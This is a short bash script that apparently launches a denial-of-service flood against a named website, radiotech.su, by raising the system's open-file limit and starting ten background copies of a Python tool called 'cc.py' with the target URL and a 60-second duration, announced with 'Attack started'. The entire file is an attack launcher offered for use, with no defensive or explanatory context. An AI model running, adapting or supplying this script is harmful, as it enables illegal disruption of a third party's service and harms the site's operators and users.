#!/bin/bash
ack="python3 cc.py -url https://radiotech.su -s 60"

#number of process that you want
process=10

#change the system limit
ulimit -n 999999

echo Attack started
for ((i=1;i<=$process;i++))
do
  $ack >/dev/null &
  sleep 0.1
done
